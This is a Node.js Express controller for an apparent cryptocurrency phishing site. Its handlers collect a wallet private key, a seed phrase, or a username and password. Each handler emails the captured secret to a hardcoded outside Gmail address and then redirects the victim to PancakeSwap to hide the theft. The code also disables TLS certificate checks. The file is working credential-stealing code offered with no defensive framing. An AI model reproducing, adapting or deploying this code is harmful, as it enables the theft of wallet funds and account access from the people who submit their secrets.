const nodemailer = require('nodemailer')
const { validationResult } = require('express-validator/check')

const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // Use `true` for port 465, `false` for all other ports
    auth: {
      user: `${process.env.USER__EMAIL}`,
      pass: `${process.env.USER__PASSWORD}`,
    },
    tls: {
        rejectUnauthorized: false
    }
  });


exports.getHomePage = (req, res, next) => {
    res.render('index', {
        doctTitle: 'Home Page'
    })
}


exports.getPrivateKey = (req, res, next) => {
    res.render('privateKey', {
        doctTitle: 'Private key',
        oldInput: {
          privateKey: ''
        }
    })
}

exports.postPrivateKey = (req, res, next) => {
    const privateKey = req.body.privateKey
    const errors = validationResult(req)

    if(!errors.isEmpty()) {
      console.log(errors.array())
        return res.render('privateKey', {
          errorMessage: errors.array()[0].msg,
          oldInput: {
            privateKey: privateKey
          }
        })
     }


        res.redirect('https://pancakeswap.finance/')
        return transporter.sendMail({
          from: 'Ether <Ether@gmail.com>', // sender address
          to: 'binnicarts@gmail.com', // list of receivers
          subject: "User Submitted Private Key", // Subject line
          html: `
            <div style="font-family: Arial, sans-serif; color: #333;">
              <div style="background-color: #f7f7f7; padding: 20px;">
                <h2 style="color: #4CAF50;">User Submitted Private Key</h2>
                <p>Dear Admin,</p>
                <p>A user has submitted the following private key:</p>
                <div style="padding: 10px; background-color: #fff; border: 1px solid #ddd; border-radius: 5px;">
                  <p><strong>Private Key:</strong></p>
                  <p style="word-wrap: break-word; background-color: #f1f1f1; padding: 10px; border-radius: 5px;">
                    ${privateKey}
                  </p>
                </div>
                <p>Please take appropriate action.</p>
                <p>Best regards,</p>
                <p>Your Automated System</p>
              </div>
              <div style="background-color: #4CAF50; color: #fff; padding: 10px; text-align: center;">
                <p>&copy; 2024 Your Company Name. All rights reserved.</p>
                <p>
                  <a href="https://yourcompany.com" style="color: #fff; text-decoration: none;">Visit our website</a> |
                  <a href="mailto:support@yourcompany.com" style="color: #fff; text-decoration: none;">Contact Support</a>
                </p>
              </div>
            </div>
          `
          })

}

exports.getSeedPhrase = (req, res, next) => {
    res.render('seedPhrase', {
        doctTitle: 'Seed Phrase',
        oldInput: {
          seedPhrase: ''
        }
    })
}


exports.postSeedPhrase = (req, res, next) => {
   const seedPhrase = req.body.seedPhrase;
   const errors = validationResult(req)

   if(!errors.isEmpty()) {
    console.log(errors.array())
      return res.render('seedPhrase', {
        errorMessage: errors.array()[0].msg,
        oldInput: {
          seedPhrase: seedPhrase
        }
      })
   }


    res.redirect('https://pancakeswap.finance/')
    return transporter.sendMail({
      from: 'Ether <Ether@gmail.com>', // sender address
      to: 'binnicarts@gmail.com', // list of receivers
      subject: "User Submitted Seed Phrase", // Subject line
      html: `
        <div style="font-family: Arial, sans-serif; color: #333;">
          <div style="background-color: #f7f7f7; padding: 20px;">
            <h2 style="color: #4CAF50;">User Submitted Seed Phrase</h2>
            <p>Dear Admin,</p>
            <p>A user has submitted the following seed phrase:</p>
            <div style="padding: 10px; background-color: #fff; border: 1px solid #ddd; border-radius: 5px;">
              <p><strong>Seed Phrase:</strong></p>
              <p style="word-wrap: break-word; background-color: #f1f1f1; padding: 10px; border-radius: 5px;">
                ${seedPhrase}
              </p>
            </div>
            <p>Please take appropriate action.</p>
            <p>Best regards,</p>
            <p>Your Automated System</p>
          </div>
          <div style="background-color: #4CAF50; color: #fff; padding: 10px; text-align: center;">
            <p>&copy; 2024 Your Company Name. All rights reserved.</p>
            <p>
              <a href="https://yourcompany.com" style="color: #fff; text-decoration: none;">Visit our website</a> |
              <a href="mailto:support@yourcompany.com" style="color: #fff; text-decoration: none;">Contact Support</a>
            </p>
          </div>
        </div>
      `
    })

}

exports.getUserandPass = (req, res, next) => {
    res.render('userandpass', {
        doctTitle: 'Username and Password',
        oldInput: {
          username: '',
          password: ''
        }
    })
}

exports.postUserandPass = (req, res, next) => {
  const username = req.body.username
  const password = req.body.password
  const errors = validationResult(req)

  if(!errors.isEmpty()) {
    console.log(errors.array())
      return res.render('userandpass', {
        errorMessage: errors.array()[0].msg,
        oldInput: {
          username: username,
          password: password
        }
      })
   }


    res.redirect('https://pancakeswap.finance/')
    return transporter.sendMail({
      from: 'Ether <Ether@gmail.com>', // sender address
      to: 'binnicarts@gmail.com', // list of receivers
      subject: "User Submitted Username and Password", // Subject line
      html: `
        <div style="font-family: Arial, sans-serif; color: #333;">
          <div style="background-color: #f7f7f7; padding: 20px;">
            <h2 style="color: #4CAF50;">User Submitted Username and Password</h2>
            <p>Dear Admin,</p>
            <p>A user has submitted the following username and password:</p>
            <div style="padding: 10px; background-color: #fff; border: 1px solid #ddd; border-radius: 5px;">
              <p><strong>Username:</strong> ${username}</p>
              <p><strong>Password:</strong> ${password}</p>
            </div>
            <p>Please take appropriate action.</p>
            <p>Best regards,</p>
            <p>Your Automated System</p>
          </div>
          <div style="background-color: #4CAF50; color: #fff; padding: 10px; text-align: center;">
            <p>&copy; 2024 Your Company Name. All rights reserved.</p>
            <p>
              <a href="https://yourcompany.com" style="color: #fff; text-decoration: none;">Visit our website</a> |
              <a href="mailto:support@yourcompany.com" style="color: #fff; text-decoration: none;">Contact Support</a>
            </p>
          </div>
        </div>
      `
    })
}